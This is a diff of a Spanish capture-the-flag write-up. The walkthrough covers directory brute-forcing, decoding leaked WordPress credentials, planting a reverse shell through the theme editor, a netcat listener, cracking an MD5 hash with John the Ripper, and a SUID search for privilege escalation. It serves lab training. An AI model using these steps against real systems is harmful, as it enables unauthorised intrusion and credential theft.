@@ -57,14 +57,14 @@ gobuster dir --url http://10.32.2.48/ -w /usr/share/wordlists/dirbuster/director
 
 Accedemos al directorio **/robots** y nos encontramos con dos ficheros de interés. Listamos el contenido del fichero **key-1-of-3.txt** y encontramos la primera flag del reto.
 
-<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-2.png" /> </p>
 
 Primera flag: ```flag{073403c8a58a1f80d943455fb30724b9}```
 
 
 Revisando otros directorios encontramos que en ```/license``` se mostraba un mensaje que parecía no muy relevante. Al observar al final de la web, nos mostraban una cadena en base64.
 
-<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-3.png" /> </p>
 
 Decodificamos la cadena para llevarla a texto claro y obtenemos un posible usuario y contraseña.
 ```
@@ -73,8 +73,8 @@ echo "ZwxsaW90kVSMjgtMDY1Mgo=" | base64 -d
 ```
 Accedemos al panel de login de Wordpress y probamos las credenciales encontradas.
 
-<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
-<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-4.png" /> </p>
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-5.png" /> </p>
 
 Ya logueados nos aprovechamos del apartado **Appearance** para subir una **reverse shell** y ganar acceso a la máquina. Agregamos la línea de código siguiente:
 ```
@@ -85,18 +85,16 @@ Posteriormente nos ponemos en escucha en nuestra máquina local con ```netcat```
 nc -nlvp 4142
 ```
 
-<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
-
 Dentro de la máquina víctima procedemos a listar el contenido del directorio **/home/robot**
 
-<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-6.png" /> </p>
 
 Nótese que el archivo de la flag solo puede ser leído por el propietario. Revisamos el fichero **** y encontramos unas credenciales potenciales. 
 
-<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-7.png" /> </p>
 
 La contraseña se encontraba cifrada en MD5 por lo que tubimos que descifrarla utilizando la herramienta ```John The Ripper```
-<p align="center"> <img src="../../img_JCE_UCI2024/reto5-1.png" /> </p>
+
 ```
 john --format=raw-md5 --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
   
@@ -106,12 +104,13 @@ john --format=raw-md5 --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
   Press 'q' or Ctrl-C to abort, almost any other key for status
 
   abcdefghijklmnopqrstuvwxyz (robot)
-
 ```
+
 En este punto nos podemos convertir en el usuario robot proporcionando la contraseña encontrada y listamos la segunda flag del reto.
 ```
 su robot
 ```
+
 ```
 robot@linux:~$ cat key-2-of-3.txt
 cat key-2-of-3.txt
@@ -123,3 +122,6 @@ Para encontrar la tercera y última flag del reto necesitamos escalar privilegio
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
+<p align="center"> <img src="../../img_JCE_UCI2024/reto5-8.png" /> </p>
+
+
